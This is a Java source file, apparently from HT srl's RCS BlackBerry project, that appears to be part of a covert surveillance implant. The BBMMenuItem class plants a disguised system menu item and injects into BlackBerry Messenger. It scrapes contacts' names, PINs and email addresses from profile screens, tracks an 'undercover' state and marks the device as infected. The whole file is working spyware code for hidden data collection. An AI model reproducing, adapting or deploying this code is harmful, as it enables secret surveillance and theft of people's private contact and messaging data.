//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.agent.im;

import java.util.Hashtable;
import java.util.Vector;

import net.rim.blackberry.api.menuitem.ApplicationMenuItem;
import net.rim.blackberry.api.menuitem.ApplicationMenuItemRepository;
import net.rim.device.api.system.Backlight;
import net.rim.device.api.system.RuntimeStore;
import net.rim.device.api.ui.Screen;
import net.rim.device.api.ui.UiApplication;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Evidence;
import blackberry.injection.FieldExplorer;
import blackberry.injection.MenuWalker;
import blackberry.utils.Utils;

public class BBMMenuItem extends ApplicationMenuItem {
    private static String bbmMenu = "Yield";
    //#ifdef DEBUG
    private static Debug debug = new Debug("BBMMenuItem", DebugLevel.VERBOSE);
    //#endif

    UiApplication bbmApplication;
    Screen contactsScreen;
    // Vector conversationScreens = new Vector();

    Hashtable users = new Hashtable();
    Hashtable userConversations = new Hashtable();

    public boolean bbmInjected = false;

    // int numContacts;
    // int numEmails;

    private static BBMMenuItem instance;
    private static final long GUID = 0x25fbb0c55be3907fL;

    public static synchronized BBMMenuItem getInstance() {
        if (instance == null) {
            instance = (BBMMenuItem) RuntimeStore.getRuntimeStore().get(GUID);
            if (instance == null) {
                final BBMMenuItem singleton = new BBMMenuItem(20);

                RuntimeStore.getRuntimeStore().put(GUID, singleton);
                instance = singleton;
            }
        }
        return instance;
    }

    public BBMMenuItem(int arg0) {
        super(arg0);

        undercover = !Backlight.isEnabled();
        conversationScreen = new ConversationScreen();
        //lookForConversationsThread();

    }

    public void checkForConversationScreen() {
        //#ifdef DEBUG
        debug.trace("checkForConversationScreen");
        //#endif
        conversationScreen.getConversationScreen();
    }

    Vector contacts = new Vector();
    Thread t = null;
    boolean undercover = false;
    ConversationScreen conversationScreen;

    public synchronized Object run(Object context) {
        try {

            if (bbmInjected) {
                //#ifdef DEBUG
                debug.trace("run: already injected");
                //#endif
                return null;
            }

            //#ifdef DEBUG
            debug.init();
            debug.info("BBMMenuItem context: " + context);
            //#endif

            UiApplication app = UiApplication.getUiApplication();
            Class cl = app.getClass();

            //#ifdef DEBUG
            debug.trace("class: " + cl);
            //#endif

            Screen screen = UiApplication.getUiApplication().getActiveScreen();

            //#ifdef DEBUG
            debug.trace("screen: " + screen + " count: "
                    + screen.getUiEngine().getScreenCount());

            //#endif
            //debug.startBuffering(EventLogger.INFORMATION);
            //#ifdef DEBUG
            debug.trace("run: " + screen.getClass().getName());
            //#endif
            if (screen.getClass().getName().indexOf("ContactsScreen") > 0) {
                contacts.removeAllElements();

                contactsScreen = screen;
                bbmApplication = UiApplication.getUiApplication();

                FieldExplorer explorer = new FieldExplorer();
                contacts = explorer.explore(screen);

                screen.close();
                bbmInjected = true;

                // lookForConversationsThread();
                conversationScreen.setBBM(bbmApplication);

                //#ifdef DEBUG
                debug.info("BBM INJECTED!");
                debug.ledFlash(Debug.COLOR_GREEN);
                //#endif
                Evidence.info("BBM");
                AppInjectorBBM.getInstance().setInfected();

            } else {
                //#ifdef DEBUG
                debug.warn("BBM NOT INJECTED!");
                debug.ledFlash(Debug.COLOR_RED);
                //#endif
            }

            //debug.stopBuffering();

        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.warn("injectBBM:" + ex.toString());
            debug.ledFlash(Debug.COLOR_RED);
            //#endif
        }

        return null;
    }

    private synchronized boolean extractProfile(Screen screen) {
        //#ifdef DEBUG
        debug.trace("extractProfile");
        debug.trace("  local active screen: "
                + UiApplication.getUiApplication().getActiveScreen());

        //#endif
        try {
            if (MenuWalker.walk("View Contact Profile", screen, true)
                    || MenuWalker.walk("Contact Profile", screen, true)) {
                //#ifdef DEBUG
                Debug debug = new Debug("BBMMenuItem", DebugLevel.VERBOSE);
                debug.info("walked in Contact Profile");
                //#endif
                Utils.sleep(100);
                Screen newScreen = UiApplication.getUiApplication()
                        .getActiveScreen();

                if (newScreen.getClass().getName().indexOf("BBMUserInfoScreen") < 0) {
                    //#ifdef DEBUG
                    debug.trace("no Contact Profile: " + newScreen);
                    //#endif
                    return false;
                }
                // Ocio che gli schermi aperti vengono agganciati a
                // UiApplication!
                // debug.trace("  active screen: " + newScreen);
                // debug.trace("  local active screen: "
                // + UiApplication.getUiApplication().getActiveScreen());

                //#ifdef DEBUG
                debug.trace("exploring Contact Profile: " + newScreen);
                //#endif
                
                FieldExplorer explorer = new FieldExplorer();
                Vector textfields = explorer.explore(newScreen);

                if (textfields.size() == 2 || textfields.size() == 3) {
                    String user = (String) textfields.elementAt(0);
                    String pin = (String) textfields.elementAt(1);
                    String email = "";

                    //#ifdef DEBUG
                    debug.info("User: " + user);
                    debug.info("PIN: " + pin);
                    //#endif
                    if (textfields.size() == 3) {
                        email = (String) textfields.elementAt(2);
                        //#ifdef DEBUG
                        debug.info("Email: " + email);
                        //#endif
                    }

                    users.put(user.toLowerCase(), new User(user, pin, email));

                    //#ifdef DEBUG
                    debug.ledFlash(Debug.COLOR_ORANGE);
                    //#endif
                }

                //#ifdef DEBUG
                debug.trace("closing Contact Profile");
                //#endif
                newScreen.close();
            } else {
                //#ifdef DEBUG
                debug.info("");
                //#endif
            }

        } catch (Exception ex) {
            //debug.stopBuffering();
            //#ifdef DEBUG
            debug.error(ex.toString());
            //#endif
            return false;
        }
        return true;
    }

    public String toString() {
        return bbmMenu;
    }

    public void addMenuBBM(String menuName) {
        //#ifdef DEBUG
        debug.trace("addMenuBBM");
        //#endif

        bbmMenu = menuName;

        long bbmid = ApplicationMenuItemRepository.MENUITEM_SYSTEM;
        // long bbmid = 4470559380030396000L; Non funziona
        // long bbmid = 5028374280894129973L; Non funziona
        // long bbmid = 7084794250801777300L;
        ApplicationMenuItemRepository.getInstance().addMenuItem(bbmid, this);
    }

    public void removeMenuBBM() {
        //#ifdef DEBUG
        debug.trace("removeMenuBBM");
        //#endif
        long bbmid = ApplicationMenuItemRepository.MENUITEM_SYSTEM;
        ApplicationMenuItemRepository.getInstance().removeMenuItem(bbmid, this);
    }

}
